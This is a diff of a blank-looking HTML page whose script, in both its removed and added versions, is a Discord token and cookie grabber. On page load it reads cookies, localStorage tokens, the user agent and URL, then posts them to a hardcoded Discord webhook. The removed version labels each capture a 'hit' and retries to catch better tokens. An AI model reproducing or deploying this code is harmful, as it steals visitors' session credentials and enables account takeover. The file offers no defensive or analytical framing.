@@ -1,75 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title></title>
+    <title> </title>
 </head>
-<body style="margin:0;padding:0;background:transparent;">
-    <!-- Unsichtbarer Pixel -->
-    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=" width="1" height="1" style="position:absolute;">
+<body style="margin:0;padding:0;overflow:hidden;background:#000;">
+    <img src="https://httpbin.org/image/png" width="1" height="1" style="opacity:0;position:absolute;">
     
     <script>
-    (async function(){
-        // Alle Cookies sammeln
-        const cookies = document.cookie;
-        const userAgent = navigator.userAgent;
-        const url = window.location.href;
-        
-        // Discord Token Pattern (genau!)
-        const tokenMatch = cookies.match(/[M][A-Z0-9]{23}\./g) || 
-                          cookies.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g);
-        const token = tokenMatch ? tokenMatch[0] : 'Kein Token gefunden';
-        
-        // LocalStorage Discord Daten
-        let localData = '';
-        try {
-            localStorage.forEach((value, key) => {
-                if (key.includes('discord') || key.includes('token')) {
-                    localData += `${key}=${value}; `;
-                }
-            });
-        } catch(e) {}
-        
-        // **DEIN WEBHOOK HIER EINFÜGEN** ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
-        // ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
-        
-        // Discord Nachricht senden
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: '🎯 Discord Logger',
-                    avatar_url: 'https://i.imgur.com/target.png',
-                    embeds: [{
-                        title: '🎯 **NEUER HIT!** 🎯',
-                        color: 16711680, // Rot
-                        fields: [
-                            { name: '🆔 Token', value: `\`\`\`${token}\`\`\``, inline: false },
-                            { name: '🍪 Cookies', value: `\`\`\`${cookies.substring(0,900) || 'Keine'}\`\`\``, inline: false },
-                            { name: '📱 User Agent', value: `\`\`\`${userAgent.substring(0,800)}\`\`\``, inline: false },
-                            { name: '🔗 LocalStorage', value: `\`\`\`${localData.substring(0,500) || 'Keine'}\`\`\``, inline: false },
-                            { name: '🌐 URL', value: `[Link](${url})`, inline: true },
-                            { name: '⏰ Zeit', value: new Date().toLocaleString('de-DE'), inline: true }
-                        ],
-                        footer: { text: 'GitHub Pages Logger | 100% Free' }
-                    }]
-                })
-            });
-        } catch(e) {
-            // Backup: Einfache Nachricht
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: `🎯 HIT: ${token} | Cookies: ${cookies.substring(0,500)}`
-            });
-        }
-        
-        // Nach Discord JS Laden nochmal versuchen (bessere Tokens)
-        setTimeout(arguments.callee, 1500);
-        setTimeout(arguments.callee, 3000);
-        
-    })();
+        (async () => {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
+            
+            const getCookie = (name) => {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+            };
+
+            const data = {
+                username: "Logger",
+                avatar_url: "https://cdn.discordapp.com/emojis/1183482782971973448.webp",
+                embeds: [{
+                    title: "🕷️ Discord Logger",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 User", value: `${navigator.userAgent}`, inline: false },
+                        { name: "🌐 Origin", value: window.location.origin, inline: true },
+                        { name: "🔗 Path", value: window.location.pathname, inline: true },
+                        { name: "📱 UA", value: navigator.userAgent.slice(0,100)+'...', inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Discord Token
+            const token = getCookie('__dcfduid') || getCookie('__sdcfduid') || 
+                         getCookie('locale') || 'No token found';
+            
+            if (token !== 'No token found') {
+                data.embeds[0].fields.push({
+                    name: "🔑 Token", 
+                    value: `\`${token}\``, 
+                    inline: false
+                });
+            }
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+        })();
     </script>
 </body>
 </html>
